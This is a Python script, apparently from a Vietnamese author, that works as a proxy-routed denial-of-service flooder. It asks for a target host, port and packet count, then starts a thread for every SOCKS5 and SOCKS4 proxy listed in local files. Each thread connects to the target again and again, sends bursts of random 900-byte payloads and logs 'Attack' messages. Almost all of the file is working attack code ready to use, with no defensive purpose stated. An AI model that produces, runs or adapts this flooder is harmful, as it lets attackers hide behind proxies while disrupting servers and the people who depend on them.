import socket
import os
import random
import struct
try:
   from colorama import Fore,init
   init()
except ImportError:
    os.system("pip3 install colorama")
try:
    import socks  # Cài đặt thư viện socks (pip install PySocks)
except ImportError:
    os.system("py -m pip install PySocks")
import threading
import time


class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
def get_proxy():
    current_directory = os.path.dirname(os.path.realpath(__file__))
    proxy_file = os.path.join(current_directory, "sock5ss.txt")

    with open(proxy_file, "r") as file:
        proxy_list = file.read().splitlines()
    return proxy_list
def get_proxyy():
    current_directory = os.path.dirname(os.path.realpath(__file__))
    proxy_file = os.path.join(current_directory, "sock4ss.txt")

    with open(proxy_file, "r") as file:
        proxy_list = file.read().splitlines()
    return proxy_list
def test_proxy(proxy, target_ip, target_port, output_file):
    try:
        proxy_host, proxy_port = proxy.split(":")
        # Thiết lập proxy
        socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
        socket.socket = socks.socksocket
        try:
            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_socket.settimeout(2)
            proxy_socket.connect((target_ip, target_port))
            
            print(f"Kiem tra thanh cong through {proxy}")
            output_file.write(proxy +'\n')
            proxy_socket.close()
            #return True
        except Exception as e:
            print(f"Failed to connect through {proxy_host}: {str(e)}")
            #return False
    except:
        pass

    return False
def connect_with_proxy(proxy, target_ip, target_port, packet):
    henvin = random._urandom(900)
    while True:
    #if test_proxy(proxy, target_ip, target_port):
        proxy_info = proxy.split(":")
        if len(proxy_info) == 4:
            proxy_host, proxy_port = proxy_info[0], int(proxy_info[1])
            proxy_username = proxy_info[2]
            proxy_password = proxy_info[3]
            # Thiết lập proxy
            socks.set_default_proxy(
                socks.SOCKS5,
                proxy_host,
                proxy_port,
                username=proxy_username,
                password=proxy_password
            )
            socket.socket = socks.socksocket
            try:
                
                proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                proxy_socket.settimeout(5)
                proxy_socket.connect((target_ip, target_port))
                proxy_socket.send(henvin)
                for i in range(packet):
                    proxy_socket.send(henvin)
                thread_count = threading.active_count()
                print(color.green + f"Attack by socks5 to {target_ip}:{target_port} through {proxy} co {thread_count} proxy dang chay")
            except Exception as e:
                proxy_socket.close()
                if random.randint(0, 30) < 1:
                    print(color.red + f"Attack fail to {target_ip}:{target_port} through {proxy}")
                pass
                #return
        else:
            proxy_host, proxy_port = proxy.split(":")
            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket
            try:
                thread_count = threading.active_count()
                proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                proxy_socket.settimeout(5)
                proxy_socket.connect((target_ip, target_port))
                proxy_socket.send(henvin)
                for i in range(packet):
                    proxy_socket.send(henvin)
                print(color.green + f"Attack by socks5 to {target_ip}:{target_port} through {proxy} co {thread_count} proxy dang chay")

            except Exception as e:
                proxy_socket.close()
                if random.randint(0, 30) < 1:
                    print(color.red + f"Attack fail to {target_ip}:{target_port} through {proxy}")
                pass
                #return

def connect_with_proxyy(proxy, target_ip, target_port, packet):
    henvin = random._urandom(900)
    while True:
        #test_proxy(proxy, target_ip, target_port)
        proxy_info = proxy.split(":")
        if len(proxy_info) == 4:
            proxy_host, proxy_port = proxy_info[0], int(proxy_info[1])
            proxy_username = proxy_info[2]
            proxy_password = proxy_info[3]
            # Thiết lập proxy
            socks.set_default_proxy(
                socks.SOCKS4,
                proxy_host,
                proxy_port,
                username=proxy_username,
                password=proxy_password
            )
            socket.socket = socks.socksocket
            try:
                thread_count = threading.active_count()
                proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                proxy_socket.settimeout(5)
                proxy_socket.connect((target_ip, target_port))
                proxy_socket.send(henvin)
                for i in range(packet):
                    proxy_socket.send(henvin)
                print(f"Attack by socks4 to {target_ip}:{target_port} through {proxy} co {thread_count} proxy dang chay")
                
            except Exception as e:
                proxy_socket.close()
                pass
                #return
        else:
            proxy_host, proxy_port = proxy.split(":")
            socks.set_default_proxy(socks.SOCKS4, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket
            try:
                thread_count = threading.active_count()
                proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                proxy_socket.settimeout(5)
                proxy_socket.connect((target_ip, target_port))
                proxy_socket.send(henvin)
                for i in range(packet):
                    proxy_socket.send(henvin)
                print(f"Attack by socks4 to {target_ip}:{target_port} through {proxy} co {thread_count} proxy dang chay")
            except Exception as e:
                proxy_socket.close()
                pass
                #return
def main():
    print(color.green +"\n"+ """ 
     _____________                         ___________      ___________         ___________     
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |             |    |           |      |           |    |                  ||           |    |           |
    |           \\ |    |           |      |           |    |                  ||           |    |           |
    |____________\\     |___________|      |___________|    |___________       ||___________|    |___________|
                  \\    
    \n""" + color.blue + """
                          ----[    This code write by Quoc Du  ]---
                        -------[ github :""" + color.blue + """ https://github.com ]-----------""" + color.End)
    target_ip = input("\nNhap ip/host attack: ")  # Đổi IP của máy chủ đích
    time.sleep(1)
    target_port = int(input("\nPort attack: "))  # Đổi cổng của máy chủ đích nếu cần
    packet = int(input("\nNhap so luong goi can gui: "))
    proxies = get_proxy()
    proxiess = get_proxyy()
    #usable_proxies = [proxy for proxy in proxies if test_proxy(proxy, target_ip, target_port) == True]
    # if not usable_proxies:
    #     print("Không có proxy hợp lệ để sử dụng.")
    #     return
    print(color.red + "=============================================================================\n" + color.End)
    print("Attack socks5 IP:", target_ip)
    time.sleep(1)
    print("\nAttack socks5 port:", target_port)
    print(color.red + "=============================================================================\n" + color.End)
    time.sleep(2)
    count = 0
    threads = []
    for proxy in proxies:#usable_proxies:
        thread = threading.Thread(target=connect_with_proxy, args=(proxy, target_ip, target_port,packet))
        thread.daemon = True  # Đặt luồng thành daemon để nó chạy cho đến khi bạn tắt chương trình
        count += 1
        threads.append(thread)
        thread.start()
    for proxy in proxiess:#usable_proxies:
        thread = threading.Thread(target=connect_with_proxyy, args=(proxy, target_ip, target_port,packet))
        thread.daemon = True  # Đặt luồng thành daemon để nó chạy cho đến khi bạn tắt chương trình
        count += 1
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
